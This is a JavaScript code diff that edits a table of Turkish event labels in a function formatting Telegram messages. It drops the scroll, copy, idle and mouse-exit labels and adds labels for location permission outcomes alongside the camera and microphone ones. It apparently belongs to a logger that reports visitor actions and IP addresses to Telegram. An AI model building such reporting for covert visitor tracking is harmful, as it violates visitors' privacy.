@@ -78,14 +78,13 @@ function formatTelegramMessage(logData, ip) {
         'download': '⬇️ İNDİRME',
         'consent_granted': '✅ İZİN VERİLDİ',
         'consent_rejected': '❌ İZİN REDDEDİLDİ',
-        'scroll_milestone': '📜 SCROLL MİLESTONE',
-        'text_copied': '📋 METİN KOPYALANDI',
+        'location_permission_granted': '📍 KONUM İZNİ VERİLDİ',
+        'location_permission_denied': '🚫 KONUM İZNİ REDDEDİLDİ',
+        'location_not_supported': '⚠️ KONUM DESTEKLENMİYOR',
         'camera_permission_granted': '📷 KAMERA İZNİ VERİLDİ',
         'camera_permission_denied': '🚫 KAMERA İZNİ REDDEDİLDİ',
         'microphone_permission_granted': '🎤 MİKROFON İZNİ VERİLDİ',
-        'microphone_permission_denied': '🚫 MİKROFON İZNİ REDDEDİLDİ',
-        'user_idle': '😴 KULLANICI HAREKETSİZ',
-        'mouse_left_page': '🖱️ FARE SAYFA DIŞINA ÇIKTI'
+        'microphone_permission_denied': '🚫 MİKROFON İZNİ REDDEDİLDİ'
     };
 
     const title = eventIcons[event_type] || '🔔 YENİ OLAY';
